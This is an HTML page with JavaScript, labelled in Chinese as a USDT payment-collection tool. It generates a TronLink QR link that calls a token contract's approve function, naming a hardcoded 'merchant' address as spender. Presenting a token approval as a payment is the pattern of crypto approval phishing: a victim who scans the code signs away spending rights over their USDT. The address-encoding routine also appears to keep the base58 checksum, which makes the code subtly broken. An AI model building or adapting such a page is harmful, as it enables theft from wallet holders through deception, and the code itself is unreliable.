<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>海內外接碼 - USDT 授權收款</title>
<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
<style>
body{font-family:sans-serif;text-align:center;padding:40px}
input{padding:10px;font-size:16px;width:220px}
button{padding:10px 20px;font-size:16px;margin-top:10px}
#qrcode{margin-top:20px}
</style>
</head>
<body>

<h2>海內外接碼</h2>
<p>輸入本次收款金額（USDT）</p>

<input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
<br>
<button onclick="generate()">生成授權 QR</button>

<div id="qrcode"></div>

<script>
// 你的收款地址
const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
// USDT 合約地址
const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"

function toSun(amount){
  return BigInt(Math.floor(parseFloat(amount) * 1000000))
}

function pad64(hex){
  return hex.padStart(64, '0')
}

function base58ToHex(address){
  const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
  let num = BigInt(0)
  for (let char of address) {
    num = num * BigInt(58) + BigInt(alphabet.indexOf(char))
  }
  let hex = num.toString(16)
  if(hex.length % 2) hex = "0" + hex
  return hex
}

function generate(){
  const amountInput = document.getElementById("amount").value
  if(!amountInput || amountInput <= 0){
    alert("請輸入正確金額")
    return
  }

  const amount = toSun(amountInput)

  let addressHex = base58ToHex(merchant)
  addressHex = addressHex.substring(2)

  const encodedAddress = pad64(addressHex)
  const encodedAmount = pad64(amount.toString(16))

  const parameter = encodedAddress + encodedAmount

  const url =
    "https://link.tronlink.org/#/wallet/contract?contract=" +
    usdtContract +
    "&functionSelector=approve(address,uint256)&parameter=" +
    parameter

  document.getElementById("qrcode").innerHTML = ""

  QRCode.toCanvas(document.createElement("canvas"), url, function (err, canvas) {
    if(err){
      alert("生成 QR 失敗")
      return
    }
    document.getElementById("qrcode").appendChild(canvas)
  })
}
</script>

</body>
</html>
